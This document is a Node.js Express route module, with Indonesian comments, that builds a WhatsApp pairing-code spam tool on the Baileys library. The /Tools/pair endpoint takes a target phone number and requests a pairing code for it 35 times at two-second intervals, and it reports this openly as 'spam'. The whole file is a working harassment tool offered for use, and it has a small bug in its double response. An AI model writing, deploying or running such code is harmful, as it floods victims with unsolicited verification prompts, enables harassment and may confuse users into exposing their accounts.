const axios = require('axios');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@adiwajshing/baileys');
const pino = require('pino'); // Untuk logger

module.exports = function(app) {
app.get('/Tools/pair', async (req, res) => {
    try {
        // Parsing parameter `q` dari request body
        const { target } = req.query;



        if (!target) {
                return res.status(400).json({ error: 'Parameter `number` is required' });
            }

        const { state } = await useMultiFileAuthState('XSession');
        const { version } = await fetchLatestBaileysVersion();

        // Membuat koneksi WhatsApp socket
        const sucked = await makeWaSocket({
            auth: state,
            version,
            logger: pino({ level: 'fatal' })
        });

        // Menyusun balasan sukses sebelum memulai loop
        let successMessage = `Starting to spam for number.`;
        res.json({ message: successMessage });

        // Melakukan pengulangan pairing code
        for (let i = 0; i < 35; i++) {
            await sleep(2000); // Delay antara request
            let prc = await sucked.getPairingCode(target);
        }

        res.json({ message: `Completed Send Spam to ${target}` });

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Internal Server Error: ' + error.message });
    }
});
};